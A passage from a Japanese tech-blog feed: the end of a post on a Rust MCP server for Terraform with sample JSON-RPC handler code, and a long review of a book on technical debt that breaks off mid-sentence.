        }     } }}6. 具体的なメソッドハンドラの実装例例として、tools/list メソッドのハンドラ実装：async fn handle_tools_list(&self, transport: &StdioTransport, id: u64) -> anyhow::Result<()> {    // ツール一覧を含むJSONを取得    let tools_value: serde_json::Value = serde_json::from_str(TOOLS_JSON)        .expect(\\"tools.json must be valid JSON\\");    // レスポンスを作成して送信    let response = Message::Response {        jsonrpc: \\"2.0\\".to_string(),        id,        result: Some(tools_value),        error: None, };    transport.send(response).await?;    Ok(())}ツール呼び出しハンドラの実装例：async fn handle_tools_call(    &mut self,    transport: &StdioTransport,    id: u64,    params_val: serde_json::Value,) -> anyhow::Result<()> {    let name = params_val        .get(\\"name\\")        .and_then(|v| v.as_str())        .unwrap_or(\\"\\");    logging::info(&format!(\\"Handling tools/call for tool: {}\\", name));    match name {        \\"get_terraform_plan\\" => {            // Terraform プランを取得            match self.tfmcp.get_terraform_plan().await {                Ok(plan) => {                    // 結果のJSONを構築                    let result_json = json!({ \\"plan\\": plan });                    let obj_as_str = serde_json::to_string(&result_json)?;                                        // テキストレスポンスとして送信                    self.send_text_response(transport, id, &obj_as_str).await?;             }                Err(err) => {                    // エラーレスポンスを送信                    self.send_error_response(                        transport,                        id,                        JsonRpcErrorCode::InternalError,                        format!(\\"Failed to get Terraform plan: {}\\", err),                    ).await?;             }         }     }        // 他のツールハンドラ...        _ => {            self.send_error_response(                transport,                id,                JsonRpcErrorCode::MethodNotFound,                format!(\\"Tool not found: {}\\", name),            ).await?;     } }    Ok(())}これらのコードパターンにより、tfmcp は MCP プロトコルの JSON-RPC メッセージを効率的に処理し、Terraform コマンドの実行結果をクライアントに返すことができます。Rust の主要な利点としては以下が挙げられます。型安全性: serde による強力なシリアライズ/デシリアライズの型検証強力なエラーハンドリング: Result 型と thiserror によるエラー処理非同期処理: tokio と async/await による効率的な非同期I/Oトレイトベースの抽象化: Transport トレイトによる異なる通信方式のサポートメモリ安全性: ランタイムの安全性とパフォーマンスrust-sdkMCPは規格が明確なので拡張がとても早いです。Rust にもSDKが出てました。こちらも良いので合わせて紹介しておきます。syu-m-5151.hatenablog.comsyu-m-5151.hatenablog.comおわりにtfmcp は、Terraform と LLM の統合における最初の一歩です。MCP（Model Context Protocol）に関して色々説明してきましたが、すごく簡単に言うなら「LLMのためのAPIサーバー」です。この技術を活用することで、インフラストラクチャの管理に自然言語インターフェースをもたらし、複雑な IaC (Infrastructure as Code) の作業を簡素化することができます。Model Context Protocol は、AIモデルがローカル環境のリソースやツールに安全にアクセスするための架け橋となります。実装自体はシンプルなJSON-RPCベースのプロトコルなので、皆さんも自分の得意な分野や業務で使えるMCPサーバーを実装してみてください。AIとのコラボレーションの可能性が大きく広がるはずです。Rust による実装は、型安全性、堅牢なエラー処理、効率的な非同期処理など、多くの利点をもたらしています。特に通信プロトコルの実装において、これらの特性は重要な役割を果たし、AIとツールの間のやり取りをスムーズかつ確実に行うための信頼性の高い基盤となっています。とても楽しいです。また、こちらも応援お願いします。こちらCfPを書きました。皆様の応援が力になるので投票お願いします。生成AIによるCloud Native 基盤構築の可能性と実践的ガードレールの敷設について | CloudNative Days Summer 2025 https://t.co/vs2EfE2m41 #CNDS2025— nwiizo (@nwiizo) 2025年2月25日   あ、会社にも所属していて技術支援もやっているので興味があれば話をしましょうやー！sreake.com各種参考リンクModel Context Protocol 公式ドキュメントMCP メッセージフォーマットとトランスポート仕様MCP GitHub リポジトリMCP TypeScript SDKAnthropic の MCP 紹介記事Cline における MCP の解説記事MCPで広がるLLM　~Clineでの動作原理~","isoDate":"2025-03-08T17:00:57.000Z","dateMiliSeconds":1741453257000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Qiitaの自己紹介欄に何書く？　というポエム","link":"https://qiita.com/masaru-komiyama/items/781912e64e09d5ac8e90","contentSnippet":"はじめに皆様、こんばんは。カラーコードの覚え方 や、適当なプログラムを書いた共有に超初級編などと銘打つ記事 など、 ふと頭によぎった技術ネタや、興味が湧いた技術ネタなど、一貫性の無いネタを自由に…","isoDate":"2025-03-07T13:22:22.000Z","dateMiliSeconds":1741353742000,"authorName":"masaru-komiyama","authorId":"masaru-komiyama"},{"title":"無限技術的負債 - Taming Your Dragon: Addressing Your Technical Debt の読書感想文","link":"https://syu-m-5151.hatenablog.com/entry/2025/03/07/133504","contentSnippet":"はじめに「Taming Your Dragon: Addressing Your Technical Debt」を読み終えて、技術的負債という厄介な問題への理解が大きく深まりました。この本は2024年7月にO\'Reillyから出版され、技術的負債というドラゴンの正体とその退治法について包括的に解説しています。多くのエンジニアにとって身近な「誰がこんなコードを書いたんだ！...あ、私か」という経験から始まり、技術的負債の本質と効果的な管理方法へと読者を導いてくれます。learning.oreilly.com私たちエンジニアは普段、「美しいコードを書く芸術家」か「とりあえず動けばOKの実務家」かという二択で自分を見がちです。しかし実際には、納期に追われて「まぁ動くからいっか」と書いたコードが、数ヶ月後に「誰だこんな恐ろしいものを作ったのは！」という悲鳴に変わる悪夢のループから抜け出せないことも多いのではないでしょうか。これこそが「技術的負債」という悪魔もしくはドラゴンの卵が孵化する瞬間です。平凡なプログラマー・nwiizoは、ある日、長年使われてきた古い社内システム「Ｃシステム」でごく普通のプログラム部品を追加しようとしたところ、突然画面にエラーメッセージが溢れ、システムが完全に動かなくなってしまいます。会社の先輩プログラマーたちから、この巨大で一体化した管理システムを操作する権限をもらいましたが、すでに修正すべき不具合リストには何百もの未解決問題が積み上がっている状態で、自分の問題が解決される順番はいつになるかわかりません。nwiizoはシステム停止の警告に悩まされながら待ち続けますが、調査するうちにこのシステムの内部構造が信じられないほど複雑に絡み合っていることに気づきます。プログラムの中には決まった数値をむやみに書き換える人、テスト用の環境で好き勝手に変更する人、コードの整理に奮闘する人、緊急の修正を求めて管理者に詰め寄る人など、様々な混乱が広がっていました。nwiizoは問題を見つけるための様々な道具を使いますが、なぜかシステムの根本からの改善は「前例がない」と許可されません。この状況から逃げ出そうとしても、このシステムの外側には、この古いシステムに頼って動いている無数の小さなサービスプログラムが広がっていました。まるで古い城の土台が崩れかけているのに、その上に次々と新しい部屋を増築しているような状態です。nwiizoは気づきます。今はまさに《技術的負債の時代》、すべてのコードが少しずつ劣化し、誰も全体を理解できない環境に自分はいるのだと。あなたも、きっと「誰がこんなコードを書いたんだ！」と頭を抱えながらチケットキューに並んだことがあるでしょう。あるいは数ヶ月前の自分が書いたハードコードされた値を見て「これ誰が書いたんだ？...あ、私か」と冷や汗をかいたことがあるはずです。安心してください、あなたやnwiizoだけではありません。私たちは皆、技術的負債というドラゴンの前で怯えているのです。技術的負債の起源と本質「技術的負債」という言葉は近年広く使われるようになりましたが、その明確な定義はなく、理解が曖昧なまま用いられることが多いのが現状です。Ward Cunningham氏が技術的負債の概念の生みの親と言われていますが、最初に\\"負債\\"という言葉を用いたのは1992年のOOPSLA \'92 Experience Reportでした。「最初のバージョンをリリースすることは、ある意味で借金を背負うようなものです」興味深いことに、レポート全体を見てもdebt（負債）としか言及しておらず、technical（技術的）という言葉は付いていません。後に彼自身がWikiで解説しているように、このメタファーが生まれた背景は純粋に学術的なものではなく、職場でのコミュニケーションにおいて、金融ソフトウェアを開発していた彼が上司に説明するために使った「金融の例え話」だったのです。t_wadaさんによる翻訳記事でも詳しく解説されています。その後、いつ頃からか「技術的負債（Technical Debt）」という言葉が広まっていきましたが、いつ誰が最初に「技術的」を付け加えたのかは明確ではありません。Cunningham氏は技術的負債について次のように説明しています。「ソフトウェアを急いでリリースし、開発過程で様々な気づきを得ても、それらの学びをコードに反映しないケースは数多くあります。これは返済不要だと思って借金をするようなものです。たとえばクレジットカードの場合、そんなことを続けていれば、最終的には収入のすべてが利息の支払いに消え、実質的な購買力はゼロになってしまうでしょう」「負債というメタファーの本質は、その返済能力にあります。これをうまく活用できるかどうかは、問題を理解した時点でリファクタリングできるような、きちんと構造化されたコードを書けるかどうかにかかっているのです」技術的負債に抱く多くの人のイメージはネガティブなものですが、Cunningham氏の説明にはそのようなニュアンスはありません。彼はあくまで「リファクタリング可能な十分に設計されたコード」を前提に話しており、「不摂生により病気になってしまった」ようなネガティブな状況ではなく、「成長して身体に合わなくなった服や靴を替える」ような状況をイメージしていたのです。乱雑なコードは技術的負債なのか？『Clean Architecture』などのCleanシリーズでお馴染みのRobert C. Martin氏（通称ボブおじさん）は、技術的負債と単なる乱雑さを明確に区別しています。「乱雑さは技術的負債ではありません。乱雑さはただの乱雑さです。技術的負債は意識的な選択の結果であり、戦略的な理由から生じるものです。リスクはあっても将来的な価値があります。一方、乱雑なコードを作る決断は合理的ではなく、ただの怠慢と不注意から生じるものであり、将来的な価値はありません」Martin氏も、Ward Cunningham氏と同様に雑なコードには賛成しておらず、「技術的負債は戦略的に選択されるものであり、単なる乱雑さとは異なる」と強調しています。技術的負債の多角的理解Martin Fowler氏は技術的負債の四象限という概念を提唱し、「無鉄砲／慎重」と「意図的／不注意」という二つの軸で負債を分類しました。この四象限フレームワークは、技術的負債をより体系的に考えるための重要なツールです。例えば「慎重・意図的」な負債は、ビジネス価値を早期に提供するための意識的な選択である一方、「無鉄砲・不注意」な負債は単に悪い設計の結果として発生します。Fowler氏によれば、技術的負債の議論において重要なのは次の点です。「設計上の問題が負債に当たるかどうかを議論するよりも、負債というメタファーがその問題を考えたり議論したりする助けになるかどうかを考えるべきです。このメタファーの大きな利点は、技術者以外の人々にも理解されやすい点にあります」また、Fowler氏は別の記事TechnicalDebtでも技術的負債について考察し、次のような洞察を提供しています。「品質の低いコードは、驚くほど早く影響を及ぼします。緊急の機能追加が遅延するのです。技術的負債を蓄積したチームは、コード品質の向上に時間をかけたチームよりも、結果的に開発のペースが落ちてしまいます」これは技術的負債の重要な側面を示しています。負債の影響は将来の問題だけでなく、すぐに現在の開発速度にも影響を与えるのです。技術的負債は本質的に技術的問題というよりもトレードオフの意思決定問題です。負債のメタファーはソフトウェア開発の状況を非技術者にも説明しやすくする点で有用ですが、全ての状況に当てはまるわけではありません。金融の負債に対する理解は人によって異なり、ソフトウェア開発のすべての側面を金融の仕組みで説明することには限界があります。本書「Taming Your Dragon」では、技術的負債の本質、その影響、そして効果的な管理方法について詳しく解説されています。短期的な利益（機能の早期リリース）と長期的なコスト（保守性の低下）のバランスをどう取るべきか、組織全体でどのように技術的負債に取り組むべきかなど、実践的なアプローチが示されています。心の準備はいいですか？ nwiizoと同じように、コードの迷宮へと足を踏み入れる勇気を持ちましょう！Part I Exploring Technical Debt1. What Is Technical Debt?基本概念の再定義技術的負債は本質的に技術的問題ではなくトレードオフの意思決定問題です。Technopediaによれば「容易だが限定的な解決策を選択した際に発生する将来的な再作業のコスト」と定義されます。つまり、単なる「悪いコード」ではなく、短期的利益（機能追加や早期納品）と長期的コスト（保守性低下）の間の意識的選択の結果です。Taming Your Dragon: Addressing Your Technical Debt (English Edition)作者:Brown, Dr. Andrew RichardApressAmazon昨今のソフトウェア開発現場では、何か問題が発生すると「技術的負債のせいだ」と安易に結論づける風潮が見られます。しかし、この「技術的負債」という言葉が本来の意味から逸脱し、単なる言い訳や責任転嫁の道具になっていないでしょうか。すべての問題が技術的負債に起因するという考え方は、複雑な開発現場の実態を過度に単純化している可能性があります。実際には、プロジェクト管理の不備、要件定義の曖昧さ、あるいは単純な実装ミスなど、多様な要因が問題の背景に存在することが多いのです。技術的負債の玉ねぎモデル著者が提案する多層構造モデルは、技術的負債を複数の層で捉えます。Figure 1-1 The technical debt onion model より引用テクニカル層はコードやアーキテクチャの問題、トレードオフ層は個人の意思決定メカニズム、システム層は組織構造の影響、さらに経済学/ゲーム理論層と厄介な問題層（複雑で一義的解決策のない問題）があります。このモデルが示唆するのは、技術的負債を持続的に管理するには全ての層に取り組む必要があるということです。表面的な修正だけでは、時間の経過とともに元の状態に戻ってしまいます。技術的負債の分類法Fowlerの4象限（慎重/無謀 \xd7 意図的/無意識的）は代表的な分類です。Figure 1-2 The technical debt quadrant より引用金利率による分類も実用的です。高金利負債は放置すると急速にコスト増大する領域、低金利負債は影響が限定的な領域、無金利負債は実質的な影響がない領域です。レベルによる分類では、アーキテクチャ負債（最もコストが高い）、コード負債、その他の負債に区分されます。SDLCステージによる分類はどの開発段階で負債が発生したかを示し、トレードオフの種類による分類は何と引き換えに負債を受け入れたかを明らかにします。負債管理の実践的アプローチ高金利負債から優先的に返済することが重要です。頻繁に変更される中核コンポーネントの負債を最優先すべきです。技術的負債の影響を経営層が理解できる言葉で表現することも効果的です。「このリファクタリングを後回しにすると保守コストが20%増加します」など、具体的な数字で示すと説得力が増します。がこのときにはやはり数字的な根拠が必要です。組織構造の影響を理解することも大切です。コンウェイの法則を認識し、部門横断的視点で負債を可視化する必要があります。継続的な管理プロセスを確立することも不可欠です。単発の対処ではなくシステムとしての改善が求められます。まとめ技術的負債を効果的に管理するには、技術者だけでなく、マネージャーやステークホルダーを含めた組織全体の協力が必要です。単一のモデルや手法に頼るのではなく、複数の視点を統合し状況に応じて適切なアプローチを選択できるアダプティブな姿勢が鍵となります。2. Why You Need to Address Technical Debt負債の二面性を理解する技術的負債は必ずしも「悪」ではないです。著者は金融負債との類似性を指摘し、適切に管理された技術的負債が組織に価値をもたらす場合もあると説明しています。家を購入するためのモーゲージのように、戦略的に活用すれば事業価値を生み出すことができるのです。しかし、「返済できない負債」「より良い代替手段がある場合」「間違った資金調達を選んだ場合」には問題が発生します。この金融アナロジーは非技術系の経営層にも理解しやすく、共通認識を築く上で役立つと感じました。『良い戦略、悪い戦略』は技術的負債の考え方と深く関連しています。ルメルトが説く「良い戦略」の本質—正確な診断、明確な指針、一貫した行動—は、技術的負債の管理にも直接応用できます。「良い負債」は明確な目的と返済計画を持つ戦略的選択であり、「悪い負債」は単なる近視眼的回避策です。ルメルトが強調する「選択の重要性」は、技術的リソースの配分や優先順位付けにおける難しい決断と共鳴します。技術的負債を単なる技術問題ではなく、組織の戦略的選択として捉える視点を提供する一冊です。良い戦略、悪い戦略 (日本経済新聞出版)作者:リチャード・Ｐ・ルメルト日経BPAmazon長期的影響の驚くべき事例著者が紹介する「スペースシャトルの設計が古代ローマの馬車の車輪幅に影響された」という事例は衝撃的でした。この例えは初期の技術的決定が予想をはるかに超えて長期間にわたり影響するという重要な教訓を伝えています。私自身も過去のプロジェクトで、初期データモデルの制約が何年も後の開発に影響し続ける状況を経験しました。アーキテクトとして、目前の問題解決だけでなく未来の開発者の自由度を考慮する責任があると再認識しました。企業競争力への致命的影響Netscape Navigatorの例は技術的負債の危険性を如実に示しています。80%の市場シェアを持ちながら、負債対処のための完全な書き直しで3年もの遅延が発生し、市場を失った事例は「技術的負債における破産宣告」として説得力があります。著者が経験したHMVでの事例も興味深く、プロジェクト工数の約1/3が技術的負債対応に費やされていた実態には驚かされました。特に設計段階ではなく「コーディング段階」で発見される予期せぬ負債が問題となり、短期的な回避策が長期的な負債増大につながるという悪循環が明確に説明されています。技術的負債がもたらす「六つの悪魔」著者が挙げる負債の影響は現場感覚に近く、共感できました：追加コスト - すべてのプロジェクトで負債対応のコストが発生開発テンポと納品の遅延 - 予定どおりの進行が困難になる予測可能性の低下 - 不明確な負債状況が見積もり精度を下げる非現実的なスケジュール - 「技術から遠い人ほど正確な数字を要求する一方で技術的負債に無頓着」という指摘は的確プロジェクト中止 - 負債返済コストが事業価値を上回り計画が頓挫負債のスパイラル - 遅延挽回のために更なる負債を生み出す悪循環特に負債の影響が線形ではなく、ある閾値を超えると急激に開発効率が低下するという点は実務経験とも合致し、説得力がありました。組織的問題としての技術的負債本章で最も重要な気づきは、技術的負債は技術的問題以上に組織的な問題であるという点です。HMVの事例から、意思決定プロセス、予算サイクル、部門間連携の重要性が浮き彫りになります。プロジェクトが遅れると意思決定者がリスクを取りがちになる心理的変化や、部門間のコミュニケーション不足がもたらすアーキテクチャの不整合など、組織的な要因が技術的負債を増大させる構造が明確に示されています。まとめこの章から得られた実践的な提言として、以下の点を自分のプロジェクトに取り入れたいと考えます。負債の可視化と測定による共通理解の促進継続的なリファクタリングを日常的な開発サイクルに組み込む文化の構築「良い負債」と「悪い負債」を区別する戦略的な負債管理組織全体の課題として取り組む組織的アプローチの採用「馬の尻幅」の影響が2000年続いたように、今日の技術的決定は将来に大きな影響を及ぼすという教訓は、アーキテクトとしての責任を再認識させる貴重な気づきでした。3. Why Has Technical Debt Proved So Resistant to Solutions?技術的負債への誤解多くの組織が技術的負債を単なる「技術的問題」として捉える誤解が本章の核心です。著者は「暗闇で鍵を失くした酔っ払いが街灯の下だけを探す」という例えを用いて、私たちが解決策を間違った場所で探していることを鋭く指摘しています。ソフトウェアアーキテクトとして、この指摘に強く共感します。日々の業務でチームが「このコードは技術的負債だから修正しよう」と議論するとき、多くの場合「悪いコード」を直すことだけに注力し、なぜそのコードが生まれたのか、背景にあるトレードオフの判断や組織的要因を見落としがちです。また過信効果（overconfidence effect）の指摘も的確です。技術的負債を金融負債のアナロジーで理解しているため、実際より理解していると錯覚し、深い探求を怠ることがあります。ライト、ついてますか　問題発見の人間学作者:ドナルド・C・ゴース,ジェラルド・M・ワインバーグ共立出版Amazon技術的負債ライフサイクルの誤認著者が提示する技術的負債のライフサイクル図は非常に啓発的でした。Figure 3-1 Technical debt life cycle, starting from when it is created より引用一般的な理解（Figure 3-1）では、技術的負債の作成から始まるライフサイクルを想定していますが、これは不完全です。Figure 3-2 Technical debt life cycle, beginning with events that led to its creation より引用著者が示す完全なライフサイクル（Figure 3-2）では、組織構造の作成→プロジェクトの見積もり→プロジェクトの遅延といった前半部分が無視されていることが明らかになります。私自身の経験でも、技術的負債はコードが書かれるずっと前から、不適切な見積もりや無理なスケジュール、チーム間の不十分なコミュニケーションなどにより発生しています。にもかかわらず、多くの組織は「悪いコード」だけを見て、「なぜ開発者はこんなコードを書いたのか」と問い、真の原因を見逃しています。近因と究極因の区別著者の「近因（proximate cause）と究極因（ultimate cause）」の区別についての議論は大変示唆に富んでいます。事故調査の例を用いて、近因（心臓停止）と究極因（飲酒運転）を区別する重要性を説明していますが、これは技術的負債の分析にも当てはまります。究極因を追求することが技術的負債対策の本質だという指摘は核心を突いています。「5つのなぜ」テクニックを用いて深く掘り下げることで、表面的な「悪いコード」という近因を超え、組織構造や意思決定プロセスといった根本原因に到達できます。実務では、近因で分析を終わらせることが多いのは、責任の所在が明確になり、組織の自己反省を避けられるという「便利さ」があるためです。しかし、これでは同じ問題が繰り返し発生することになります。「重要だが緊急ではない」問題としての技術的負債アイゼンハワー大統領の「私には2種類の問題がある：緊急なものと重要なもの。緊急なものは重要ではなく、重要なものは決して緊急ではない」という言葉を引用した著者の分析は、技術的負債の優先順位付けの難しさを見事に表しています。技術的負債は典型的な「重要だが緊急ではない」問題です。著者の本の執筆（重要だが締め切りまで9ヶ月ある）と会議の資料作成（重要性は低いが数日後に必要）の比較は、緊急性が優先順位付けを支配する現実を示しています。私のチームでも、新機能開発やバグ修正などの「緊急」タスクが、リファクタリングやアーキテクチャ改善より常に優先されます。技術的負債が十分に蓄積されてシステムが機能不全になってようやく「緊急」問題となりますが、その時には対処コストが膨大になっています。成果が見えにくい技術的負債対策「誰も起こらなかった問題を修正したことに対して称賛されることはない」というネルソン・レペニングの言葉は、技術的負債対策の本質的な困難さを表しています。技術的負債削減の効果はすぐには現れず、多くの領域に分散するため、明確に債務削減プログラムに起因するものとして認識されにくいのです。また恩恵を受ける側も、そのメリットを認識せず、あるいは自分たちの努力の結果と捉える傾向があります。大規模リファクタリングプロジェクトを実施しても「何も変わっていない」と評価された経験は、多くの開発者が共感するでしょう。「問題が発生しなかった」ことを証明するのは非常に難しいのです。「銀の弾丸」が存在しない現実フレッド・ブルックスの「人月の神話」を引用した著者の指摘は的確です。技術的負債削減には「銀の弾丸」は存在せず、前払いの努力と投資が必要なのです。技術的負債の中心的な問いは「技術的負債を減らしたいですか？」ではなく「将来の技術的負債負担を減らすために今日何を犠牲にする準備がありますか？」という点にあります。この視点の転換は非常に重要です。現代のソフトウェア開発では、新フレームワークやAIなど「銀の弾丸」として喧伝される解決策が次々と現れる中で、地道な技術的負債対策は地味に見えがちです。しかし、真の改善には継続的な取り組みが不可欠なのです。技術的問題として捉えたい心理「We Desperately Want Technical Debt to Be a Technical Problem」というセクションは、私たちの心理を鋭く突いています。マネージャーや経営陣は技術的負債を技術的問題として捉えることで、「エキサイティングな」新規イニシアチブに集中できます。技術者も、現在のトレードオフ決定の一部として認めるよりも「後で対処する問題」として先送りしたいのです。この心理は痛いほど身に覚えがあります。ビジネス側は「スコープクリープを許可した決定」や「見積もりの甘さ」による影響を認めたくなく、技術者も「ビジネス側の圧力」を責任転嫁の理由にする傾向があります。技術的負債を組織全体の共同責任として捉え改善していく視点が必要だという著者の提言は、深く共感します。変化管理としての技術的負債対策技術的負債削減の取り組みが組織変革の一種であるという著者の指摘は非常に重要です。大きな改善を得るためには技術的負債が作られる原因に焦点を当てる必要があります。組織構造やトレードオフ決定のプロセス、プロジェクト見積もりの方法などに対処する必要があるのです。この視点は私のアプローチを変えました。技術的負債対策を単なる技術的改善ではなく組織変革として捉え、変化に対する抵抗を予測し対処する計画を立てることの重要性を認識しました。総括と実践への示唆本章から得た最も重要な教訓は、技術的負債を単なる技術的問題ではなく、組織的課題として捉える必要性です。技術的負債への効果的な対処には：技術的負債の真の性質と根本原因への理解を深める組織全体の問題として認識し、全体で取り組む変化管理の手法を取り入れ、抵抗に対処する成果を可能な限り可視化し、継続的な取り組みのモチベーションを維持するこれらの教訓を自分のプロジェクトに適用し、技術的負債に対するより効果的なアプローチを構築していきたいと思います。Part II Understanding the Technical Debt Problem4. The Broken Analogy問題理解におけるアナロジーの役割アナロジー（類推）は複雑な問題を理解する強力なツールです。著者はヨハネス・ケプラーの例を挙げ、惑星運動の法則発見までの道のりで、彼が熱、光、磁気力、渦巻く水流など様々なアナロジーを試し、検証し、限界を見極めていった過程を紹介しています。ケプラーの方法論で重要なのは、単一のアナロジーに固執せず、複数のアナロジーを「容赦なく検証」し、より良いものを見つけては前のものを捨てる姿勢です。著者はこれを技術的負債への我々のアプローチと対比し、「金融負債へのアナロジーの欠陥を容赦なく検証し、より良いアナロジーのために捨てているだろうか？」と問いかけています。著者は良いアナロジーには「親しみやすさ」と「代表性（正確さ）」のバランスが必要と指摘します。この観点から評価すると、技術的負債の金融負債アナロジーは「親しみやすいが正確性が低い」象限Aに位置します。ビジネス関係者の初期理解には役立つものの、誤解を招く恐れがあるのです。特に上記のアナロジーに関する議論と関連して、本書は抽象化によって本質を見抜き、具体例を通じて理解を深める方法を提供しています。ケプラーが様々なアナロジーを試し、捨て、より良いものを見つけていったプロセスは、まさに具体と抽象の間を行き来する思考法の実践例といえるでしょう。具体と抽象作者:細谷 功dZERO（インプレス）Amazon金融負債アナロジーの限界金融負債アナロジーがビジネス関係者の理解を助けた理由は、「財務」がビジネスの共通言語であることと、多くの人が個人的に金融負債を経験していることにあります。このアナロジーが正しく機能する側面として：- 返済が通常必要である- 時間とともにコストが増大する- その存在が他の活動を制限する- 高レベルの負債は深刻な負担となるしかし問題は、「私たちが正確性よりも理解のしやすさを優先した」ことにあります。著者はより正確な技術的負債の例えとして「特殊な車のローン」を提案しています。このローンでは借りた金額がわからず、返済時期も不明確で、金利も部分によって異なり、返済計画は外部イベントに左右され、さらに親族にはクレジットカードが無料配布されるという恐ろしいものです。代替アナロジー：肥満問題著者が提案する最初の代替アナロジーは「肥満問題」です。肥満は技術的負債と次の点で類似しています。直接的・間接的な影響：肥満は直接的（余分な体重による機械的ストレス）または間接的（ホルモンや代謝の変化）に影響します。技術的負債も同様に直接的（修正作業）または間接的（経済的に成り立たなくなるプロジェクト）に問題を引き起こします。自己強化的性質：極度の肥満は運動能力を低下させ、さらに肥満解消を困難にします。高レベルの技術的負債も同様に自己強化的になります。根本的な誤解：1970年代の肥満対策は脂肪摂取量の削減に焦点を当て、食品業界は脂肪を減らす代わりに糖分を増やした結果、肥満は増加しました。技術的負債も同様に、要因を技術的なものだけと考えると、特定の要因を監視する一方で他の要因を見逃すリスクがあります。肥満アナロジーからは「システムマッピング」という有用なツールも得られます。イギリス政府の肥満問題への「システムアトラス」アプローチは、技術的負債の異なる側面を地図化する際にも応用できるでしょう。その他の代替アナロジー環境汚染アナロジーは、「汚染を生み出す決定をする者とその恩恵を受ける者が同一である一方、その結果に苦しむ者は決定に関与していない」という重要な洞察をもたらします。技術的負債も同様に、負債を生み出す決定をする人は恩恵を受けますが、対処コストを負担するのは別の人々です。依存症アナロジーでは、著者は「技術的負債を増やす結果をもたらす行動への依存」を指摘します。例えば納期を守るために技術的負債を増やす決断を繰り返し、その悪影響を認識しながらも止められない状態です。摩擦アナロジーはフォン・クラウゼヴィッツの「戦争論」から取られています。クラウゼヴィッツは「戦争では全てが単純だが、単純なことが難しい」と述べ、戦場での摩擦を「無数の小さな困難の蓄積」と説明しました。技術的負債の影響も同様に、最も単純なタスクさえ困難にします。クラウゼヴィッツは摩擦は常に存在し完全に排除できないものだと指摘しつつ、最小化する努力を怠るべきではないと主張しました。この洞察は技術的負債管理にも当てはまります。複数アナロジーの実践的活用この章から得た最も重要な教訓は、単一のアナロジーに縛られず、複数の視点から技術的負債を理解する必要性です。技術的負債はその「玉ねぎモデル」が示すように多層的な問題であり、各層には異なるアナロジーが適しているのです。私の実務経験からも、ビジネス関係者との初期対話では金融アナロジーを使いつつ、より深い議論では段階的に他のアナロジーを導入することが効果的だと感じています。例えば：技術的負債を予算化する際には金融アナロジー負債の蓄積メカニズムを説明する際には依存症アナロジー開発プロセスへの影響を説明する際には摩擦アナロジー技術的負債のトレードオフを議論する際に異なるアナロジーを意識的に使い分けることで、より生産的な議論が可能になります。例えば「この機能を期限までに実装するために技術的負債を受け入れるか」という古典的なトレードオフを、単に「借金を増やすか」としてではなく、「システムを肥満させるか」「摩擦を増やすか」「汚染物質を放出するか」といった多様な視点から検討することで、より豊かな議論が可能になります。複数のアナロジーを使いこなせるアーキテクトは、技術チームとビジネス側の双方と効果的にコミュニケーションを取り、組織全体で技術的負債に対する共通理解を形成することができるでしょう。それこそが継続的な技術的負債管理への第一歩となります。5. Technical Debt As a Trade-Off Problem技術的負債と人間の意思決定メカニズム技術的負債は単なる技術問題ではなく、人間の意思決定メカニズムに根ざしたトレードオフ問題です。著者は技術的負債の「玉ねぎモデル」の第2層である「トレードオフ層」を詳細に分析し、特に「アフェクト・ヒューリスティック」と呼ばれる感情に基づく直感的判断の影響を掘り下げています。私たちの意思決定能力は進化の過程で発達したものです。祖先が直面していた環境では「速さ」「質の低い情報でも機能すること」「認知的負荷が低いこと」が重要でした。これにより私たちの意思決定の大部分は無意識下で行われるという重要な特性が生まれました。意識的な論理的思考はあまりにも遅く、情報処理に限界があるためです。カーネマンの「ファスト&スロー」は人間の思考を「システム1」（速い、直観的）と「システム2」（遅い、論理的）に分類しています。技術的負債の文脈では、即時の問題解決を優先するシステム1の思考が、長期的な技術的健全性より優先されがちです。時間や認知的制約から、多くの技術的決断は直感に頼ることになり、これが技術的負債の発生につながります。この人間の意思決定メカニズムを理解することが、技術的負債への効果的な対策に重要です。ファスト＆スロー　（上）作者:ダニエル カーネマン,村井 章子早川書房Amazonアフェクト・ヒューリスティックの重要性アフェクト・ヒューリスティックは、現在の感情的印象を利用して意思決定を導く心理的ショートカットです。私たちが「直感」や「腹の感覚」と呼ぶものの正体です。このヒューリスティックの重要な特性は①感情を用いること②「感覚」を通して行動を仲介すること③高速であること④変化に抵抗し経験を通してのみ変化すること⑤意識的評価が不可能であることです。私たちが論理的な決断をしていると思っていても、実際には感情的システムがすでに決断を下しており、理性はただそれを正当化しているに過ぎないのです。技術的負債の蓄積を促す意思決定の非対称性著者が提示する例は非常に示唆的です。プロダクトオーナーが技術的負債を増やす新機能を開発するかどうかを決断する場面で：機能開発を選択した場合の利益は「即時的」「確実」「具体的」「自分が経験する」「感情的」という特性を持ちます。これらは強い感情的印象を生み出し、アフェクト・ヒューリスティックに強く影響します。対照的に、技術的負債を避けることの利益は「将来的」「不確実」「無形」「他者が経験する」「理性的」という特性を持ちます。これらは感情にほとんど訴えず、理性的システムにのみ響きます。この非対称性によって、意思決定において技術的負債の側面がほとんど考慮されないという問題が生じます。これが技術的負債が過度に蓄積する構造的要因の一つであり、私自身のプロジェクト経験とも強く共鳴します。喫煙予防プログラムからの教訓喫煙予防プログラムの事例は技術的負債管理に重要な示唆を与えます。当初の論理的なメッセージは効果が限定的でしたが、タバコパッケージに喫煙の生々しい害を視覚的に表現するなど、感情に訴えかける戦略に転換して初めて成功しました。喫煙の利益と害の構造は技術的負債のトレードオフと全く同じです。この教訓から、技術的負債を避ける決断に影響を与えたいなら、論理よりも感情に訴えかける必要があると理解できます。精密さと価値の問題著者が導入する「精密さ」と「価値」の概念も重要です。音楽辞典の例を用いて、比較可能な状態では内容を重視し、比較できない状態では精密に評価できる表面的な属性に重きを置く傾向があると指摘しています。新機能や早期納品の利益は高い精密さをもって評価できますが、技術的負債の回避による利益は精密さを欠いています。このため、不確実で無形な技術的負債の重要性が過小評価されがちなのです。チャレンジャー宇宙船事故の例からも、精密に表現できない懸念が無視される危険性が理解できます。これは技術リーダーとして、技術的負債の影響をより具体的かつ精密に表現する工夫が必要だと強く感じさせる部分です。技術的負債管理のための実践的アプローチ著者が紹介する「ユリシーズ契約」は非常に実践的です。将来の自分を特定の状況下で拘束するための事前のコミットメントとして、例えばスプリント中に生じた技術的負債が閾値を超えた場合、次のスプリントに返済タスクを含めることを事前に約束する方法は、すぐに実践できそうです。「同時決定vs連続決定」の概念も興味深いです。複数の決定を同時に行うと、多様化バイアスにより健康的な選択肢（技術的負債の返済）を含める傾向があるという指摘は、スプリント計画の改善に応用できそうです。また、プロジェクトの状況がリスク選好に与える影響についての洞察も重要です。プロジェクトがスケジュール通りの場合はリスク